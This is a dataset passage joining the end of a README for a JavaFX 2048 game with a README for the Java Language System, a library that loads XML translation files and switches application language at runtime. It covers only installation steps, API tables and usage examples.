  - Smooth scaling animations for tile appearances and merges.

#### 2. **Class: `Main`**
This is the entry point for the application, where the game window is initialized and displayed.

Key Components:
- **JavaFX Setup**:
  - Configures the game window and scene.
  - Loads the FXML file for the game UI.
  - Initializes the game controller (`Game2048`).
- **Event Handling**:
  - Registers key listeners for arrow keys.
  - Handles button actions for New Game and Exit Game.
- **CSS Loading**:
  - Loads the CSS file for styling the game.

#### 3. **Maven XML Configuration: `pom.xml`**
This file contains the Maven project configuration, including dependencies for JavaFX and JUnit.

Key Components:
- **JavaFX Dependencies**:
  - Includes JavaFX modules for controls and FXML.
  - Configures the JavaFX plugin for running the application.
- **JUnit Dependency**:
  - Adds JUnit for testing the game logic.
  - Configures the Maven Surefire plugin for running tests.

#### 4. **Controller, Model, and View Classes**
These classes follow the MVC pattern for managing game logic, UI interactions, and rendering.

Key Components:
- **Controller**:
  - Handles user inputs and game actions.
  - Updates the model and view based on user interactions.
- **Model**:
  - Manages the game state and logic.
  - Checks for valid moves and game over conditions.
- **View**:
  - Renders the game grid and UI elements.
  - Updates the UI based on the model state.

### Styling

The game is styled with modern aesthetics, featuring:
- Rounded borders for tiles and buttons.
- Background colors based on tile values.
- Proper alignment of header (title, score, and best score).
- Button styles with hover effects.

**Color Codes for Tiles:**
- `2`: Light cream (`#eee4da`)
- `4`: Pale beige (`#ede0c8`)
- `8`: Light orange (`#f2b179`)
- Higher values progressively darker and more vibrant.

## Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/hoangsonww/Game-2048-JavaFX.git
   cd Game-2048-JavaFX
   ```

2. **Set Up JavaFX**:
  - Ensure that JavaFX is installed. If not, download JavaFX from the [official site](https://openjfx.io/).
  - Configure JavaFX in your IDE:
    - Add JavaFX libraries to your project.
    - Set JVM arguments to include JavaFX runtime, e.g.:
      ```bash
      --module-path /path-to-javafx/lib --add-modules javafx.controls,javafx.fxml
      ```

3. **Run the Game**:
  - Compile and run the `Main` class.
  - The game window will open, and you can start playing immediately.

## Usage

### Running the Game

1. **Start the Application**:
  - Run the `Main` class from your IDE or terminal.
2. **Play**:
  - Use the arrow keys to move and merge tiles.
  - Aim for a tile value of 2048 (or higher)!
3. **Reset**:
  - Click the **New Game** button to restart the game.
4. **Exit**:
  - Click the **Exit Game** button to close the application.

## File Structure

The project structure is organized as follows:

```
src/
‚îú‚îÄ‚îÄ org.example.game2048javafx/
‚îÇ   ‚îú‚îÄ‚îÄ Controller.java  # Controller for the game
‚îÇ   ‚îú‚îÄ‚îÄ Model.java       # Model for the game
‚îÇ   ‚îú‚îÄ‚îÄ View.java        # View for the game
‚îÇ   ‚îú‚îÄ‚îÄ Game2048.java    # Main game logic and UI
‚îÇ   ‚îú‚îÄ‚îÄ Main.java        # Entry point for the application
‚îÇ   ‚îî‚îÄ‚îÄ resources/       # Optional resources like images or stylesheets
‚îî‚îÄ‚îÄ README.md            # Comprehensive documentation
```

## Known Issues

1. **Game Freezing**:
  - Ensure animations do not block the main UI thread.
2. **Performance**:
  - For extremely high tile values, UI updates may lag.

## Contributing

Feel free to contribute to this project! Open issues, submit pull requests, or suggest new features.

1. **Fork the Repository**:
   ```bash
   git fork https://github.com/hoangsonww/Game-2048-JavaFX.git
   ```

2. **Create a New Branch**:
   ```bash
   git checkout -b feature/feature-branch-name
   ```

3. **Commit and Push**:
   ```bash
   git add .
   git commit -m ""Add your message here""
   git push origin feature/feature-branch-name
   ```

4. **Submit a Pull Request**:
  - Open a pull request on GitHub describing your changes.

5. **We will review your PR** and merge it if it meets the project's guidelines!

## License

This project is licensed under the [MIT License](LICENSE).

## Acknowledgments

- Inspired by the original 2048 game.
- Built with love using JavaFX.
- Author: [Son Nguyen](https://github.com/hoangsonww)

Enjoy playing 2048 in JavaFX! If you encounter any issues, feel free to raise them in the repository.

---

**Happy Coding! üöÄ**
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,8.0
KelvenCassamo/java-language-system,main,"<!-- Badges -->
![Version](https://img.shields.io/github/v/tag/KelvenCassamo/java-language-system?label=Version&logo=github)
![License](https://img.shields.io/github/license/KelvenCassamo/java-language-system)


# Java Language System (JLS)


The **Java Language System (JLS)** is a Java library designed to facilitate the internationalization (i18n) of applications, enabling dynamic language management and text translation, **Swing** components, and **Widgets** on **Android**, based on XML files.

With JLS, you can:

- Initialize languages from external files or project resources.
- Switch between languages at runtime, ensuring that texts and components (or widgets) are automatically updated.
- Support multiple languages without changing the application‚Äôs source code.
- Use dynamic placeholders (`$1`, `$2`, etc.) to create personalized messages.
- Easily integrate translations into both desktop and mobile applications.


### üéâ **Modular Language import is now available starting from version 1.0.3!** üéâ
[Click here](#211-importing-individual-language-files-available-from-version-103) to learn more about the Modular Language Import feature!

### **1. Installation**

The **Java Language System (JLS)** can be easily integrated into your Java project, either by downloading the JAR file directly or by cloning the repository and compiling the source code.

#### **1.1. Downloading the JAR**

You can find the latest version of JLS in JAR format in the **Releases** section on GitHub. To do this, visit the releases page and download the JAR file:

- **Find the latest version of the JAR here**: [JLS Releases Page](https://github.com/KelvenCassamo/java-language-system/releases)
- Or, you can download the latest compiled JAR directly from the link below:
 [üì¶ Download the latest compiled JAR](https://github.com/KelvenCassamo/java-language-system/releases/download/v1.0.3/java-language-system-1.0.3.jar)


### 2. Main Features

The **Java Language System (JLS)** offers various features to facilitate the internationalization and translation of applications. 

#### **2.1. Creating the translations**

To configure the language system, start by creating translations in an XML file. Below is an example of a `languages.xml` file with translations in, for example **English** and **Portuguese**.
````xml
<languages>
    <language value=""english"">
        <translated value=""hello_world"">
            <value>Hello, World!</value>
        </translated>
        <translated value=""presentation"">
            <value>My name is $1!</value>
        </translated>
    </language>

    <language value=""portuguese"">
        <translated value=""hello_world"">
            <value>Ol√°, Mundo!</value>
        </translated>
        <translated value=""presentation"">
            <value>O meu nome √© $1!</value>
        </translated>
    </language>
</languages>


````
-   **Language keys** (e.g., `hello_world`, `presentation`) are identifiers for the text.
-   **Placeholders** (e.g., `$1`) can dynamically insert values into the text.


#### **2.1.1. Importing Individual Language Files** (Available from version 1.0.3)

Starting from version **1.0.3**, the **Java Language System (JLS)** supports importing language definitions from individual files. This feature allows you to modularize your translations by splitting each language into a separate file.

#### Example: Importing Individual Language Files

To use this feature, you can reference external XML files for each language using the `<import-language>` tag. Here‚Äôs an example:

```xml
<languages>
    <import-language file=""languages/english.xml""/>
    <import-language file=""languages/portuguese.xml""/>
    <import-language file=""languages/spanish.xml""/>
</languages>

```
Each imported file (`languages/english.xml`, `languages/portuguese.xml`, etc.) should follow the standard format for defining translations. Below is an example of how a language file should look:

Example: `languages/english.xml`
```xml
<language value=""english"">
    <translated value=""hello_world"">
        <value>Hello, World!</value>
    </translated>

    <translated value=""presentation"">
        <value>My name is $1!</value>
    </translated>

    <translated value=""multi_line_message"">
        <value>
            Welcome to our platform!
            We are excited to have you here, $1.
            If you have any questions, feel free to reach out to our support team at $2.
            Let's make this journey a great success!
        </value>
    </translated>

    <translated value=""read"">
        <value tense=""infinitive"">Read</value>
        <value tense=""past"">Read</value>
        <value tense=""participle"">Read</value>
        <value tense=""gerund"">Reading</value>
    </translated>
</language>

```
#### Compatibility
This feature is available starting from version **1.0.3**. Ensure you are using this version or newer to take advantage of this functionality.


#### **2.2. Structure of a `languages.xml` File**

The `languages.xml` file contains translations for various languages and their respective text values. Below is a detailed table explaining each element and attribute in the file.

|
| **Element/Attribute** | **Description**                                                                                     | **Attributes**                      | **Example**                                    |
|------------------------|----------------------------------------------------------------------------------------------------|--------------------------------------|------------------------------------------------|
| `<languages>`          | Root element that contains all language definitions.                                               | None                                 | `<languages> ... </languages>`                 |
| `<import-language>` | References an external XML file that contains the definitions for a specific language. | `file` (path to the language file) | `<import-language file=""languages/english.xml""/>` |
| `<language>`           | Represents a specific language and contains its translations.                                      | `value` (language code)              | `<language value=""english""> ... </language>`   |
| `<translated>`         | Defines a single translation entry, identified by a unique key.                                     | `value` (translation key)            | `<translated value=""hello_world""> ... </translated>` |
| `<value>`              | Specifies the actual translation text for a given key.                                             | None                                 | `<value>Hello, World!</value>`                 |
| `<value>` | Specifies the actual translation text for a given key. Can optionally include tense information. Available from version 1.0.3. | `tense` *(optional)* (e.g., ""infinitive"", ""past"", ""participle"", ""gerund"") | `<value tense=""infinitive"">Read</value>`

> **Note:** The `tense` attribute is available starting from **version 1.0.3**.


#### **2.3. Attributes Details**

#### `<language>` Attributes
- **`value`**: The language code or name (e.g., ""english"", ""portuguese""). This helps in identifying the language.

#### `<translated>` Attributes
- **`value`**: The unique key for the translation (e.g., ""hello_world"", ""presentation""). This key is used to reference the translation programmatically.
#### `<value>` Attributes
- **`tense`** *(optional, available from version 1.0.3)*: Specifies the grammatical tense of the translation. This attribute is used for verbs to define their tense. Supported values include: 
	- `infinitive`: Represents the base form of the verb (e.g., ""to read"" or ""read""). 
	- `past`: Represents the past tense of the verb (e.g., ""read"" in English, ""leu"" in Portuguese). 
	- `participle`: Represents the past participle of the verb (e.g., ""read"", ""lido""). 
	- `gerund`: Represents the gerund form of the verb (e.g., ""reading"", ""lendo""). 




#### **2.4. Language Initialization from Files or Resources**

JLS allows you to initialize the language system in two ways:

- **From external XML files**, which is useful when you have translation files outside your source code (e.g., in a directory or location accessible by the application).
- **From internal project resources**, making it easy to include the XML file directly within the app package without the need for external access.

**Example of initialization from an external file:**
```java
LanguageSystem.initializeFromFile(""english"", ""path/to/languages.xml"");
```
**Example of initialization from an internal resource:**
````java
LanguageSystem.initializeFromResources(""english"", ExampleFromRes.class, ""path/to/resources/languages.xml"");
````

#### **2.5. Dynamic Language Change**

With JLS, you can change the application‚Äôs language at runtime, allowing texts and interface components to be automatically updated to the new language. This is done using the `setCurrentLanguage` method, passing the desired language code.

**Example of language change:**
````java
LanguageSystem.setCurrentLanguage(""portuguese"");
````

When changing the language, JLS automatically translates all registered components to the new language.

#### **2.6. Automatic Component Translation**

The system supports the automatic translation of graphical interface components, such as **Swing** components (e.g., `JLabel`, `JButton`) and **Widgets** (e.g., `TextView`, `Button`, `EditText`, and others with the method **setText**) on Android, using predefined translation keys. You can associate a translation key with a component, and it will be automatically updated when the language is changed.

#### **Example of automatic translation for Swing components:**
````java
JLabel label = new JLabel();
LanguageSystem.autoTranslateComponent(label, ""hello_world"");
````

**Important Note:** The `autoTranslateComponent` method should be called only once for each component. In the example above, the text of the `JLabel` will be automatically translated based on the selected language.

#### **Example of automatic translation for Android widgets:**
````java
TextView textView = new TextView();
LanguageSystem.autoTranslateView(textView, ""hello_world"");
````

**Important Note:** The `autoTranslateView` method should be called only once for each widget. In the example above, the text of the `TextView` will be automatically translated based on the selected language.

**Alternatives for components and widgets:** As an alternative, you can use the `get` method of the `LanguageSystem` class, for example:

**For widgets:**
````java
TextView textView = new TextView();
textView.setText(LanguageSystem.get(""hello_world""));
````

**For components:**
````java
JLabel label = new JLabel();
label.setText(LanguageSystem.get(""hello_world""));
````

#### **2.7. Support for Dynamic Placeholders**

JLS supports the use of **dynamic placeholders** in translations, allowing variable values to be inserted into messages. This is useful for personalized messages, such as greetings or warnings, where parts of the text can change depending on the context.

Placeholders are represented by **$1**, **$2**, etc., in the translation file. You can replace these placeholders with specific values when calling the translation.

#### **Example of translation with placeholders:**
````xml
<translated value=""presentation"">
    <value>My name is $1!</value>
</translated>
````

**Example of usage in code:**
````java
String translatedText = LanguageSystem.getf(""presentation"", ""Cassamo"");
````
The result would be: `""My name is Cassamo!""`.

**Note:** The `LanguageSystem.getf(translation_key, ...placeholder_replacement)` method does not guarantee that the `translation_key` exists, and if it does not exist, it will return null. To avoid this result, you can check if the translation is available by calling the `LanguageSystem.canTranslate(translation_key)` method, which will return a boolean.

As an alternative, you can use the `LanguageSystem.format(text_content, ...placeholder_replacement)` method in conjunction with `LanguageSystem.get(translation_key, default_value)` to ensure it never returns null. Example:
````java
String translatedText = LanguageSystem.format(LanguageSystem.get(""presentation"", ""My name is $1""), ""Cassamo"");
````

#### **2.8. Word Translation with Specific Forms**

In addition to translating full sentences or phrases, JLS also supports the translation of specific words, taking into account different grammatical forms (such as tense). This is useful when you need to translate individual words like verbs in different tenses (e.g., ""read"", ""reading"", ""read"" in the past tense).

You can use the `getWord` method to get the translation of a word, optionally specifying its form (such as ""infinitive"", ""past"", ""participle"", or ""gerund"").

**Example of word translation with tense:**

```java
String translatedWord = LanguageSystem.getWord(""read"", ""participle"");
```
In the example above, the method returns the translation for the word **""read""** in the **participle** form. This allows you to handle specific translations for different verb forms.

Example of translation with tense in `languages.xml`:
````xml
<language value=""english"">
    <!-- The value=""read"" attribute represents the infinitive form of the verb. If you'd like to clarify, you can use ""to read"" instead. -->
    <translated value=""read"">
        <value tense=""infinitive"">Read</value> <!-- Infinitive form (without ""to"") -->
        <value tense=""past"">Read</value>
        <value tense=""participle"">Read</value>
        <value tense=""gerund"">Reading</value>
    </translated>
</language>
````

In this case, the word **""read""** has different translations depending on the tense: **infinitive**, **past**, **participle**, and **gerund**. The `getWord` method allows you to select the appropriate translation based on the tense you need.
#### Note on Usage:
-   The `LanguageSystem.getWord` method provides a way to fetch the translation for specific words, considering different grammatical forms, which is especially useful for verbs.
-   This method is available starting from **version 1.0.3** and supports the `tense` attribute for more accurate translations.

#### **2.9. Support for Multiple Languages**

JLS allows the inclusion of multiple languages in a single XML file, and switching between them can be done without altering the application‚Äôs source code. This makes it easy to add new languages and maintain translations in multilingual applications.

Additionally, from version **1.0.3**, you can now take advantage of **importing separate language files** into your `languages.xml` file, which allows for a more modular approach. Instead of maintaining all translations in one file, you can organize them into smaller, language-specific files and import them into the main configuration file.

This flexibility reduces the risk of a single, large file becoming overwhelming as your application grows in terms of languages and translations.

#### **Example of translation in multiple languages in XML:**
````xml
<languages>
	<language value=""english"">
	    <translated value=""hello_world"">
	        <value>Hello, World!</value>
	    </translated>
	</language>

	<language value=""portuguese"">
	    <translated value=""hello_world"">
	        <value>Ol√°, mundo!</value>
	    </translated>
	</language>
</languages>

````

#### New in version 1.0.3: Modular Language Import
````xml
<languages>
    <import-language file=""languages/english.xml""/>
    <import-language file=""languages/portuguese.xml""/>
</languages>

````

### **Notes on Version 1.0.3 Updates:**

1.  **Modular Language Support:** Instead of placing all language translations in one file, you can now import separate language files. This modular approach allows for better scalability and easier management of language files.
2.  **Improved XML Structure:** With the new `import-language` element, you can link to external language files, making it simpler to manage and update translations, especially in large projects.


### 3. Practical Example
Let's see a practical example of how to integrate the **Java Language System (JLS)** into a Java application **(Normal, Desktop and Android)**, for both configuring and switching languages, and for translating texts and displaying dynamic information with placeholders.

#### **3.1. Initial Setup**

First, let's configure the language system by loading the translations from an XML file or internal resources. Suppose we have a `languages.xml` file containing translations in English and Portuguese.
````xml
<languages>
    <language value=""english"">
        <translated value=""hello_world"">
            <value>Hello, World!</value>
        </translated>
        <translated value=""presentation"">
            <value>My name is $1!</value>
        </translated>
        <translated value=""read"">
            <!-- Adding tense information for verbs -->
            <value tense=""infinitive"">Read</value>
            <value tense=""past"">Read</value>
            <value tense=""participle"">Read</value>
            <value tense=""gerund"">Reading</value>
        </translated>
    </language>

    <language value=""portuguese"">
        <translated value=""hello_world"">
            <value>Ol√°, Mundo!</value>
        </translated>
        <translated value=""presentation"">
            <value>O meu nome √© $1!</value>
        </translated>
        <translated value=""read"">
            <!-- Adding tense information for verbs -->
            <value tense=""infinitive"">Ler</value>
            <value tense=""past"">Leu</value>
            <value tense=""participle"">Lido</value>
            <value tense=""gerund"">Lendo</value>
       </translated>
    </language>
</languages>

````


#### **3.2. Initializing the Language System**

Now, let's set up the **Java Language System (JLS)** to use the XML file with translations and define an initial language (e.g., English).

#### Without graphical interface
````java
import mz.cassamo.jls.LanguageSystem;

public class Example {

    public static void main(String[] args) {

        // Initializing the language system with the ""english"" language from an XML file
        String xmlFilePath = ""languages.xml"";
        LanguageSystem.initializeFromFile(""english"", xmlFilePath);

        // Displaying the translation for the ""hello_world"" key
        System.out.println(LanguageSystem.get(""hello_world""));  // Output: Hello, World!

        // Displaying the translation for the ""presentation"" key with placeholder
        System.out.println(LanguageSystem.getf(""presentation"", ""Cassamo""));  // Output: My name is Cassamo!

        // Available starting from version 1.0.3: Displaying the translation for the ""read"" key with tense information
        System.out.println(LanguageSystem.getWord(""read"", ""participle""));  // Output: Read (participle form)

        // If the tense is not specified, the default form (usually the infinitive) will be returned
        System.out.println(LanguageSystem.getWord(""read"", null));  // Output: Read (infinitive form)
    }
}


````

#### **3.4. Using Placeholders**

**JLS** also allows the use of **placeholders** to insert dynamic values into translations. For example, in the `""presentation""` key, we can insert a dynamic name using `$1` as a placeholder.

````java
public class ExampleWithPlaceholders {

    public static void main(String[] args) {

        // Initializing the language system with the ""english"" language
        String xmlFilePath = ""languages.xml"";
        LanguageSystem.initializeFromFile(""english"", xmlFilePath);

        // Displaying a translation with a placeholder
        String name = ""Cassamo"";
        System.out.println(LanguageSystem.getf(""presentation"", name));  // Output: My name is Cassamo!
    }
}

````




#### 3.5. In Java Swing
````java
import mz.cassamo.jls.LanguageSystem;
import javax.swing.*;
import java.awt.*;

public class ExampleWithUI {

    public static void main(String[] args) {

        // Initializing the language system with the ""english"" language from an XML file
        String xmlFilePath = ""languages.xml"";
        LanguageSystem.initializeFromFile(""english"", xmlFilePath);

        // Creating a simple graphical interface with Swing
        JFrame frame = new JFrame(""Language Switch Example"");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(300, 200);

        JLabel label = new JLabel(LanguageSystem.get(""hello_world""));
        JButton changeLanguageButton = new JButton(""Change Language"");

        // Button to switch between languages
        changeLanguageButton.addActionListener(e -> {
            String currentLanguage = LanguageSystem.getCurrentLanguage();
            if (""english"".equals(currentLanguage)) {
                LanguageSystem.setCurrentLanguage(""portuguese"");
            } else {
                LanguageSystem.setCurrentLanguage(""english"");
            }
            label.setText(LanguageSystem.get(""hello_world""));
        });

        frame.setLayout(new FlowLayout());
        frame.add(label);
        frame.add(changeLanguageButton);

        frame.setVisible(true);
    }
}
````
If you want the label text to change automatically, you can simply call the `autoTranslateComponent` method. See below:
````java
import mz.cassamo.jls.LanguageSystem;
import javax.swing.*;
import java.awt.*;

public class ExampleWithUI {

    public static void main(String[] args) {

        // Initializing the language system with the ""english"" language from an XML file
        String xmlFilePath = ""languages.xml"";
        LanguageSystem.initializeFromFile(""english"", xmlFilePath);

        // Creating a simple graphical interface with Swing
        JFrame frame = new JFrame(""Language Switch Example"");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(300, 200);

        JLabel label = new JLabel(LanguageSystem.get(""hello_world""));
        JButton changeLanguageButton = new JButton(""Change Language"");

        // Automatically translate components
        // To automatically translate components, you can use the autoTranslateComponents method
        LanguageSystem.autoTranslateComponents(""hello_world"", label, button, textArea);

        // Button to switch between languages
        changeLanguageButton.addActionListener(e -> {
            String currentLanguage = LanguageSystem.getCurrentLanguage();
            if (""english"".equals(currentLanguage)) {
                LanguageSystem.setCurrentLanguage(""portuguese"");
            } else {
                LanguageSystem.setCurrentLanguage(""english"");
            }
            label.setText(LanguageSystem.get(""hello_world""));
        });

        frame.setLayout(new FlowLayout());
        frame.add(label);
        frame.add(changeLanguageButton);

        frame.setVisible(true);
    }
}

````

#### 3.6. In Android
```java
package com.example.myapp;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import mz.cassamo.jls.LanguageSystem;

public class MainActivity extends AppCompatActivity {

    private TextView textView;
    private Button changeLanguageButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initializing the language system with the ""english"" language from an XML file
        String xmlFilePath = getFilesDir() + ""/languages.xml""; // Ensure the XML file is in the correct directory
        LanguageSystem.initializeFromFile(""english"", xmlFilePath);

        textView = findViewById(R.id.textView);
        changeLanguageButton = findViewById(R.id.button);

        // Setting the initial text of the TextView
        textView.setText(LanguageSystem.get(""hello_world""));

        // Button to switch between languages
        changeLanguageButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String currentLanguage = LanguageSystem.getCurrentLanguage();
                if (""english"".equals(currentLanguage)) {
                    LanguageSystem.setCurrentLanguage(""portuguese"");
                } else {
                    LanguageSystem.setCurrentLanguage(""english"");
                }
                textView.setText(LanguageSystem.get(""hello_world""));
            }
        });
    }
}

````
Unfortunately, for Android, it is not yet possible to initialize from Assets. This will be implemented soon.


### **4. System Requirements**

The **Java Language System (JLS)** is designed to be a lightweight and easy-to-integrate solution for different types of Java applications. Below are the system requirements and dependencies needed to use JLS.

#### **4.2. Software Requirements**

- **Java Runtime Environment (JRE)**:
    - JRE 8 or higher.
    - For development, it is recommended to use **Java Development Kit (JDK)** version 8 or higher.

#### **4.3. Platform Requirements**

The **Java Language System (JLS)** is a pure Java library, so it can be used on any platform that supports Java, including:

- **Development Environments**:
    
    - **Recommended IDEs**: IntelliJ IDEA, Eclipse, NetBeans, and Android Studio.
    - It can be used in any code editor, like VS Code, as long as the Java environment is properly set up.

#### **4.4. Application Compatibility**

- **Desktop Applications**: JLS can be easily used in Java desktop applications that utilize **Swing**.
- **Android Applications**: JLS is also compatible with Android, allowing translation of **Widgets** and texts at runtime. For integration into Android, it is necessary to set up the Android Studio development environment.


### 5. Public Methods in `LanguageSystem`

List of some public methods available in the `LanguageSystem` class. You will find details about initializing and managing supported languages.


### **5.1. Language Management**

| **Method**                                              | **Description**                                                                                           | **Parameters**                                                                                                                   | **Returns**                    |
|---------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------|--------------------------------|
| `void addLanguageSystemInterface(LanguageSystemInterface _li)` | Registers a listener to receive notifications when the language changes.                                  | `_li`: Implementation of `LanguageSystemInterface`.                                                                             | N/A                            |
| `void initializeFromFile(String default_language, String xml_file_path)` | Initializes translations from an external XML file.                                                       | `default_language`: Default language code. <br> `xml_file_path`: Path to the XML file.                                          | N/A                            |
| `void initializeFromResources(String default_language, Class _class, String xml_file_path)` | Initializes translations from a resource file in the classpath.                                           | `default_language`: Default language code. <br> `_class`: Class used to load the resource. <br> `xml_file_path`: Resource path. | N/A                            |
| `String getCurrentLanguage()`                          | Returns the current active language.                                                                      | None                                                                                                                            | Current language code.         |
| `ArrayList<String> getLanguages()`                     | Retrieves a list of all available language codes.                                                         | None                                                                                                                            | List of language codes.         |
| `ArrayList<String> getTranslationKeys(String language)` | Retrieves all translation keys for a specific language.                                                   | `language`: Target language code.                                                                                               | List of translation keys.       |
| `void setCurrentLanguage(String language)`             | Sets the current language and updates all registered components.                                          | `language`: Language code to switch to.                                                                                        | N/A                            |
| `boolean existsLanguage(String language)`              | Checks if a specified language is available.                                                              | `language`: Language code to check.                                                                                            | `true` if the language exists. |
| `boolean existsKey(String key)`                        | Checks if a specific translation key exists in the system.                                                | `key`: Translation key to check.                                                                                               | `true` if the key exists.      |

---

### **5.2. Component Translation**

| **Method**                                              | **Description**                                                                                           | **Parameters**                                                                                      | **Returns**                    |
|---------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|--------------------------------|
| `void autoTranslateComponent(Component component, String language_key)` | Translates a Swing component using the specified language key.                                            | `component`: Component to translate. <br> `language_key`: Translation key.                         | N/A                            |
| `void autoTranslateComponents(String language_key, Component... components)` | Translates multiple Swing components using the same language key.                                        | `language_key`: Translation key. <br> `components`: List of components to translate.                | N/A                            |
| `boolean canTranslateComponent(Component component)`   | Checks if a component is translatable (e.g., it has a `setText` method).                                  | `component`: Component to check.                                                                    | `true` if translatable.        |

---

### **5.3. String Translation**

| **Method**                                              | **Description**                                                                                           | **Parameters**                                                                                      | **Returns**                    |
|---------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|--------------------------------|
| `String get(String key)`                               | Retrieves the translated value for a specific key.                                                        | `key`: Translation key.                                                                              | Translated string or `null`.   |
| `String get(String key, String default_value)`         | Retrieves the translation for a key, or a default value if the key is not found.                          | `key`: Translation key. <br> `default_value`: Fallback value.                                       | Translated string or fallback. |
| `String getf(String key, String... values)`            | Retrieves and formats a translation string, replacing placeholders with values.                           | `key`: Translation key. <br> `values`: Values to replace placeholders.                              | Formatted translated string.   |
| `String getWord(String key, String tense)` | Retrieves the translation of a word with a specific tense (e.g., infinitive, past, participle, gerund). | `key`: The translation key for the word. <br> `tense`: Optional. Tense to retrieve (e.g., ""infinitive"", ""past"", ""participle"", ""gerund""). | The translated word, or null if not found. |
|
### **Note:** 
- The method `getWord` is **available starting from version 1.0.3** and allows retrieving translations with a specific tense. If no tense is specified, the default (typically the infinitive) will be returned. 
- This method is useful for handling words with multiple forms depending on the tense (e.g., verb conjugations).
---

### **5.4. String Formatting**

| **Method**                                              | **Description**                                                                                           | **Parameters**                                                                                      | **Returns**                    |
|---------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|--------------------------------|
| `String format(String text, String... values)`         | Formats a string by replacing placeholders with specified values.                                         | `text`: String to format. <br> `values`: Values to insert into placeholders.                        | Formatted string.              |
| `boolean isFormatable(String text)`                    | Checks if a string contains placeholders for formatting.                                                  | `text`: String to evaluate.                                                                         | `true` if formatable.          |

---

### **5.5. Debugging**

| **Method**                                              | **Description**                                                                                           | **Parameters**                                                                                      | **Returns**                    |
|---------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|--------------------------------|
| `void setDebugMode(boolean _debug)`                    | Enables or disables debug mode.                                                                           | `_debug`: `true` to enable debug mode, `false` to disable it.                                        | `void`                           |
| `boolean isDebugMode()`                                | Checks if debug mode is currently enabled.                                                                | None                                                                                               | `true` if debug mode is on.    |





### 6. XMLBuilder

The **XMLBuilder** is a class that simplifies the creation, manipulation, and storage of translations in XML format. It provides an interface for managing languages, adding translations, and saving the data to XML files, as well as handling existing resources.



#### **6.1. Main Features**

- **XML file reading**: Allows loading existing translations from a file.
- **Dynamic translation management**: Adds and removes languages and translations programmatically.
- **Automatic file creation**: If the XML file does not exist, it will be created.
- **Standardized XML format**: Ensures compatibility and readability of the generated translation file.

**Important Note**: As of version 1.0.3, XMLBuilder does **not fully support module-based imports**. The current implementation generates a single file instead of handling separate modules. Despite this limitation, it is still efficient for managing translations, especially for smaller applications or cases where module-based imports are not required.

#### **6.2. Methods**

Below are the most important methods of the class:

| **Method**                                     | **Description**                                                                                                   | **Parameters**                                                                                                    | **Return** |
|------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|-----------|
| `void loadFromFile(String path)`               | Loads translations from an XML file. If the file does not exist, it will be automatically created.                | `path`: Path to the XML file.                                                                                     | N/A       |
| `void loadFromResources(String resourcePath, Class<?> resourceClass)` | Loads translations from a resource in the classpath.                                                                 | `resourcePath`: Path to the resource.<br>`resourceClass`: Class containing the resource.                           | N/A       |
| `void putLanguage(String language)`            | Adds a new language to the system.                                                                                  | `language`: Language code to be added.                                                                              | N/A       |
| `void removeLanguage(String language)`         | Removes a specific language from the system.                                                                       | `language`: Language code to be removed.                                                                           | N/A       |
| `void putTranslation(String language, String key, String value)` | Adds or updates a translation for a specific language.                                                             | `language`: Language.<br>`key`: Translation key.<br>`value`: Translated text.                                      | N/A       |
| `void removeTranslation(String language, String key)` | Removes a specific translation from a language.                                                                   | `language`: Language.<br>`key`: Translation key.                                                                  | N/A       |
| `void saveToFile(String path)`                 | Saves the current translations to an XML file.                                                                     | `path`: Path to the XML file where the data will be saved.                                                        | N/A       |
| `void save()`                                  | Saves the translations to the original loaded path.                                                                | N/A                                                                                                               | N/A       |
| `String toXmlString()`                         | Returns an XML representation of the current translations.                                                        | N/A                                                                                                               | Generated XML. |


#### **6.3. XML File Structure**

The generated XML file follows an organized structure, as shown in the example below:

````xml
<!--JLS 1.0-->
<!--LANGUAGES: 2-->
<languages>
  <language value=""english"">
    <translated value=""hello_world"">
      <value>Hello, World!</value>
    </translated>
  </language>
  <language value=""portuguese"">
    <translated value=""hello_world"">
      <value>Ol√°, Mundo!</value>
    </translated>
  </language>
</languages>

````


#### **6.4. Usage Example**

Below is a complete example of how to use the **XMLBuilder**:

````java
package test;

import java.io.File;
import mz.cassamo.jls.LanguageSystem;
import mz.cassamo.jls.exceptions.BuilderParseException;

public class ExampleBuildingLS {
    public static void main(String[] args) {
        LanguageSystem.Builder builder = new LanguageSystem.Builder();

        try {
            // Load or create the translation file
            builder.loadFromFile(""test/languages.xml"");
            
            // Add languages
            builder.putLanguage(""english"");
            builder.putLanguage(""portuguese"");

            // Add translations
            builder.putTranslation(""english"", ""hello_world"", ""Hello, World!"");
            builder.putTranslation(""portuguese"", ""hello_world"", ""Ol√°, Mundo!"");

            // Save changes
            builder.save();
        } catch (BuilderParseException e) {
            e.printStackTrace();
        }
    }
}


````


#### **6.5. Error Handling**

The **XMLBuilder** handles common errors in a robust manner:

-   **Nonexistent file**: Creates a new empty XML file.
-   **Parsing error**: Throws specific exceptions, such as `BuilderParseException`.
-   **Invalid path**: Throws I/O (Input/Output) exceptions and logs messages in debug mode.




### **7. Contribution and Support**

#### **7.1 How to Contribute**

The **Java Language System (JLS)** is an open-source project, and we are always open to community contributions! If you wish to contribute to the development and improvement of the library, follow the steps below:

1. **Fork the repository**: Click ""Fork"" on GitHub to create a copy of the repository in your own account.
2. **Clone the repository**: Clone the repository to your computer with the command:
````bash
git clone https://github.com/your-username/jls.git
````

**Create a branch for your feature**: Before making changes, create a new branch with a descriptive name:
````bash
git checkout -b feature-name
````

4.  **Make the changes**: Make the desired modifications to the code.
